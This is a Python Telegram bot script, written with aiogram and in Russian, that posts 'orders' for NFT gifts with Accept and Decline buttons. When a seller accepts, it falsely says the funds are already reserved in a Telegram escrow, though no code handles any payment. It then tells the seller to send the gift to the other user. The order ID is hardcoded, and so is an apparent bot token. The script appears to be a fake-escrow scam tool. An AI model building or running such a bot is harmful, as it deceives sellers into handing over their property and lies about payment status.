import asyncio
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Ваш токен
TOKEN = "8790049600:AAE5gopWIOLDpR17VECTyLB3bxP02JTrlpk"

bot = Bot(token=TOKEN)
dp = Dispatcher()


# 1. Обработка команды создания ордера
@dp.message(Command("покупка"))
async def cmd_buy(message: types.Message):
  args = message.text.split(maxsplit=3)
  if len(args) < 4:
    await message.answer(
        "Используйте формат: `/покупка SwagBag #152347 49 ton`",
        parse_mode="Markdown",
    )
    return

  item_name = f"{args[1]} {args[2]}"
  price_and_curr = args[3].split()
  price, currency = price_and_curr[0], price_and_curr[1].upper()
  order_id = "TG-7XTKZUEZ"

  # Создаем кнопки «Принять» и «Отклонить»
  builder = InlineKeyboardBuilder()
  builder.button(
      text="✅ Принять предложение", callback_data=f"accept_{order_id}"
  )
  builder.button(text="❌ Отклонить", callback_data=f"decline_{order_id}")
  builder.adjust(2)

  text = (
      f"📦 *Новый ордер #{order_id}*\n\n"
      f"Предмет: *{item_name}*\n"
      f"Цена: {price} 💎 {currency}\n\n"
      "Продавец, подтвердите сделку:"
  )

  await message.answer(text, parse_mode="Markdown", reply_markup=builder.as_markup())


# 2. Обработка нажатия кнопки «Принять»
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: types.CallbackQuery):
  order_id = callback.data.split("_")[1]

  # Новая клавиатура для этапа передачи подарка
  builder = InlineKeyboardBuilder()
  builder.button(
      text="🎁 Подтвердить передачу NFT", callback_data=f"transfer_{order_id}"
  )

  updated_text = (
      f"🔒 *Ордер #{order_id} — Сделка принята*\n\n"
      "💰 Средства успешно зарезервированы в эскроу-системе Telegram (в «банке»).\n\n"
      "Инструкция для завершения:\n"
      f"1. Передайте подарок пользователю: @{callback.from_user.username}\n"
      "2. Нажмите кнопку ниже после отправки подарка."
  )

  await callback.message.edit_text(
      updated_text, parse_mode="Markdown", reply_markup=builder.as_markup()
  )
  await callback.answer("Предложение принято! Средства заморожены в эскроу.")


# 3. Обработка нажатия кнопки «Отклонить»
@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: types.CallbackQuery):
  order_id = callback.data.split("_")[1]

  await callback.message.edit_text(
      f"❌ *Ордер #{order_id} отменен*\nСделка аннулирована.",
      parse_mode="Markdown",
  )
  await callback.answer("Сделка отклонена.")


# Запуск бота
async def main():
  print("Бот запущен и ожидает сообщения...")
  await dp.start_polling(bot)


if __name__ == "__main__":
  asyncio.run(main())
  
